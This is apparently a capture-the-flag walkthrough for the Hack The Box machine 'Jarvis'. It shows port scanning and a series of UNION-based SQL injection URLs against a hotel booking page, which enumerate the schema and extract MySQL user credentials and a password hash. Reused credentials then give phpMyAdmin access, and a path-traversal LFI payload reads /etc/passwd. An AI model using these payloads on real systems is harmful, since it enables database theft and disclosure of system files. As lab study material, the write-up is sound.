# Jarvis
## Reconnaissance
### Initial Port Scan
```bash
sudo ./nmapAutomator.sh 10.10.10.143 All
```
* Result
![1](https://user-images.githubusercontent.com/53956303/132777471-26e90a91-e288-4e7b-a4bc-14dbe5729603.png)
![2](https://user-images.githubusercontent.com/53956303/132777568-83bfb8aa-006a-4851-b3c0-c9c6b7b4ee45.png)

## Emumeration
## Port 80
* On Port 80, an web page "Stark Hotel" is found

![3](https://user-images.githubusercontent.com/53956303/132777792-536702e0-e1dd-4fb9-b7e0-925502f3af84.png)
### room.php
* During the enumeration, when click the "Rooms" button, it redirects to `rooms-suites.php`. 

![4](https://user-images.githubusercontent.com/53956303/132778297-c76f7629-f239-4b5b-af28-b77b1c835f95.png)
* Then, when click "Book Now!" of any choice, it redirects to `room.php` with a parameter `cod` with assigned ID of each room.

![5](https://user-images.githubusercontent.com/53956303/132778460-85fc648b-7f6e-4a64-aea9-deecf58d9ad4.png)
## Exploitation
### Identify SQL injection Vulnerability
* Put a single qutoe `'` to at the ID number
```bash
http://10.10.10.143/room.php?cod='
```
* From the result, an interesting result is found

![6](https://user-images.githubusercontent.com/53956303/132778589-9f329755-faec-4e90-82d2-e7db0884f7f7.png)
* It does not return a room inforamtion but returns something.

### SQL Injection to Determine Number of Columns of The Query
```bash
10.10.10.143/room.php?cod=100 Union SELECT 1;-- -
.
.
.
10.10.10.143/room.php?cod=100 Uniton SELECT 1,2,3,4,5,6,7;-- -
```
* When enter 1 - 6 and 8 -, it returns the same result as a single quote

![6](https://user-images.githubusercontent.com/53956303/132779048-d2cfbdac-7945-4571-be7e-6c70f47b4b37.png)

* When enter 7 as columns, it returns something different

![7](https://user-images.githubusercontent.com/53956303/132779081-b647b00c-4e3d-4a8b-ba6c-dc064f23af3e.png)
* It means there has 7 columns in query

### SQL Injection to List Databases
```bash
http://10.10.10.143/room.php?cod=100 UNION SELECT 1,group_concat(schema_name),3,4,5,6,7 from information_schema.schemata;-- -
```
* From the result, some database names are retruned

![9](https://user-images.githubusercontent.com/53956303/132779289-483a1f7e-88d9-4170-8b82-aef700c57fc3.png)

### SQL Injection to List Tables Names in `mysql` Database
```bash
http://10.10.10.143/room.php?cod=100 UNION SELECT 1, group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema='mysql';-- -
```
* From the result, some table names are given

![12](https://user-images.githubusercontent.com/53956303/132779614-adb07544-7294-4d1d-ba79-113deb09196a.png)
* Open the page source to see every table names

![13](https://user-images.githubusercontent.com/53956303/132779676-2a157379-5d38-402d-be65-80538f03b245.png)

### SQL Injection to List Column Names in `user` table
```bash
http://10.10.10.143/room.php?cod=100 UNION SELECT 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name='user';-- -
```
* From the result, some colum names are found

![14](https://user-images.githubusercontent.com/53956303/132779763-62bebec1-7d4a-42cc-8d8b-6969dd4b3541.png)
  * From the list of column names, interesting column names `User` and `Password` are found

### SQL Injection to Extract values from `User` and `Password` columns
```bash
http://10.10.10.143/room.php?cod=100 UNION SELECT 1, user, 3,4,password,6,7 from mysql.user;-- -
```
* From the result, username and password hash are found

![15](https://user-images.githubusercontent.com/53956303/132780030-6b12ecf3-f690-4d82-99dc-28ee461f6b82.png)
 `DBadmin / 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0`
 ### Crack the Password Hash using 
 * From the [CrackStation](https://crackstation.net), the password hash is cracked

![16](https://user-images.githubusercontent.com/53956303/132780197-52e8bb19-f7ef-424a-93dc-80d6b78f75ef.png)
## Web Enumeration
### FFuf Result from NmapAutomator

![17](https://user-images.githubusercontent.com/53956303/132780301-0134824f-14fe-4129-91be-7f3ac27a2f48.png)
* From the result, `phpmyadmin` is found
  * Since the credentials for `DBadmin` is obtained, it might be use for "PHPMyadmin" on Port 80

### /phpmyadmin
![18](https://user-images.githubusercontent.com/53956303/132780413-4c19682b-c78e-408a-9bad-3b6494c6a7f8.png)
* With obtaiend credentials, access to PHPmyadmin is granted

![19](https://user-images.githubusercontent.com/53956303/132780505-41ec9c87-2153-4cf1-a923-ba8013265a59.png)
* From the page, version number is found
`Php Myadmin 4.8.0`
### PHPMyAdmin 4.8.x - LFI to RCE

|[PHPMyAdmin 4.8.x - LFI to RCE](https://github.com/vulnspy/vulnspy.github.io/issues/1)|
|----|
* From the post, Local File Inclusion vulnerability is working on PHP 4.8.x versions.

### Test LFI to Call `/etc/passwd` on the Target Machine
```bash
http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../etc/passwd
```
* from the result, the `/etc/passwd` file is returned

![20](https://user-images.githubusercontent.com/53956303/132780819-839b0109-91a4-4386-8b90-cba33c378faa.png)
